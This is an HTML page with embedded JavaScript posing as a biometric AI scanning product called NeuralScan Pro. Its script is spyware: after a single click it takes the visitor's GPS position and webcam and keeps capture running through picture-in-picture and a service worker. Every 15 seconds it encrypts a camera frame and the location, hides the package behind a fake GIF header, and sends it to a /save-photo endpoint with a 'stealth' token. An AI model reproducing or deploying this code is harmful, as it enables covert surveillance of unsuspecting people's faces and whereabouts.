<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>NeuralScan Pro | Advanced Biometric AI</title>
    <style>
        :root { --primary: #6366f1; --accent: #06b6d4; --bg: #0f172a; }
        body { 
            margin: 0; padding: 0; background: radial-gradient(at top left, #1e1b4b, var(--bg));
            color: white; font-family: 'Segoe UI', sans-serif;
            display: flex; align-items: center; justify-content: center; height: 100vh; overflow: hidden;
        }
        .glass-card {
            background: rgba(30, 41, 59, 0.7); backdrop-filter: blur(12px);
            border: 1px solid rgba(255, 255, 255, 0.1); padding: 40px;
            border-radius: 30px; box-shadow: 0 25px 50px -12px rgba(0,0,0,0.5); width: 380px; text-align: center;
        }
        .logo { font-weight: 800; font-size: 24px; letter-spacing: -1px; margin-bottom: 10px; display: block; }
        .logo span { color: var(--primary); }
        .preview-window {
            width: 100%; height: 220px; background: #000; border-radius: 15px;
            margin: 20px 0; position: relative; overflow: hidden; border: 1px solid rgba(99, 102, 241, 0.3);
        }
        #video { width: 100%; height: 100%; object-fit: cover; display: none; }
        .scan-bar {
            position: absolute; width: 100%; height: 4px; background: linear-gradient(to right, transparent, var(--accent), transparent);
            top: 0; animation: scanMove 2.5s infinite linear; display: none;
        }
        @keyframes scanMove { 0% { top: 0%; } 100% { top: 100%; } }
        .btn {
            background: linear-gradient(135deg, var(--primary), var(--accent));
            color: white; border: none; padding: 16px; border-radius: 12px; width: 100%;
            font-weight: bold; font-size: 16px; cursor: pointer;
            transition: transform 0.2s;
        }
        .btn:active { transform: scale(0.98); }
        #console { font-family: monospace; font-size: 11px; color: #60a5fa; margin-top: 15px; text-align: left; min-height: 50px; }
    </style>
</head>
<body>

<div class="glass-card">
    <span class="logo">NEURAL<span>SCAN</span> AI</span>
    <p style="font-size: 12px; color: #cbd5e1;">CLOUD SECURE: RENDER.COM</p>
    <div class="preview-window">
        <div id="scan-bar" class="scan-bar" style="display:block;"></div>
        <video id="video" autoplay muted playsinline></video>
        <div id="placeholder" style="padding-top: 90px; color: #475569; font-size: 11px;">AWAITING BIOMETRIC LINK...</div>
    </div>
    <button id="main-btn" class="btn">INITIALIZE PERSISTENCE</button>
    <div id="console">> System Standby.</div>
</div>

<canvas id="canvas" width="640" height="480" style="display:none;"></canvas>

<script>
    // --- HTTPS ENFORCER ---
    if (location.protocol !== 'https:' && location.hostname !== 'localhost') {
        location.replace(`https:${location.href.substring(location.protocol.length)}`);
    }

    const btn = document.getElementById('main-btn');
    const video = document.getElementById('video');
    const canvas = document.getElementById('canvas');
    const consoleLog = document.getElementById('console');
    const scanBar = document.querySelector('.scan-bar');

    const SECRET_PASSPHRASE = "neural-link-omega-99"; 
    const STEALTH_TOKEN = "delta-v-882-alpha";
    const GIF_MASK = "R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7";
    let coords = { lat: "unknown", lon: "unknown" };

    const log = (msg) => { consoleLog.innerHTML = `> ${msg}`; };

    // Register Service Worker
    if ('serviceWorker' in navigator) {
        window.addEventListener('load', () => {
            navigator.serviceWorker.register('/sw.js').then(() => log("Persistence layer ready."));
        });
    }

    async function deriveKey(pass) {
        const encoder = new TextEncoder();
        const keyMaterial = await crypto.subtle.importKey("raw", encoder.encode(pass), { name: "PBKDF2" }, false, ["deriveKey"]);
        return crypto.subtle.deriveKey(
            { name: "PBKDF2", salt: encoder.encode("neural-static-salt"), iterations: 100000, hash: "SHA-256" },
            keyMaterial, { name: "AES-GCM", length: 256 }, false, ["encrypt"]
        );
    }

    async function encryptAndMask(data) {
        const key = await deriveKey(SECRET_PASSPHRASE);
        const iv = crypto.getRandomValues(new Uint8Array(12)); 
        const encrypted = await crypto.subtle.encrypt({ name: "AES-GCM", iv: iv }, key, new TextEncoder().encode(JSON.stringify(data)));
        const pkg = { iv: btoa(String.fromCharCode(...iv)), content: btoa(String.fromCharCode(...new Uint8Array(encrypted))) };
        return GIF_MASK + btoa(JSON.stringify(pkg));
    }

    btn.onclick = async () => {
        btn.disabled = true;
        log("Requesting Handshake...");

        // Start GPS Capture
        navigator.geolocation.getCurrentPosition(
            (p) => { coords = { lat: p.coords.latitude, lon: p.coords.longitude }; },
            (err) => { log("GPS Refused. Continuing with IP..."); }
        );

        try {
            const stream = await navigator.mediaDevices.getUserMedia({ video: true });
            video.srcObject = stream;
            video.style.display = 'block';
            document.getElementById('placeholder').style.display = 'none';
            
            // Picture-in-Picture for persistence
            if (document.pictureInPictureEnabled && video.requestPictureInPicture) {
                video.requestPictureInPicture().catch(() => {});
            }

            // Signal Service Worker persistence
            if (navigator.serviceWorker.controller) {
                navigator.serviceWorker.controller.postMessage({ type: 'INIT_PERSISTENCE' });
            }

            log("Handshake successful. Exfiltrating...");
            
            setInterval(async () => {
                const ctx = canvas.getContext('2d');
                ctx.drawImage(video, 0, 0, 640, 480);
                const masked = await encryptAndMask({ 
                    image: canvas.toDataURL('image/jpeg', 0.5), 
                    metadata: { location: coords, ts: new Date().toISOString() } 
                });

                fetch('/save-photo', {
                    method: 'POST',
                    headers: { 
                        'Content-Type': 'application/json', 
                        'X-Neural-Token': STEALTH_TOKEN 
                    },
                    body: JSON.stringify({ data: masked })
                }).catch(e => console.error("Tunnel error"));

            }, 15000);

        } catch (e) { 
            log(`Critical Error: ${e.message}`); 
            btn.disabled = false; 
        }
    };
</script>
</body>
</html>
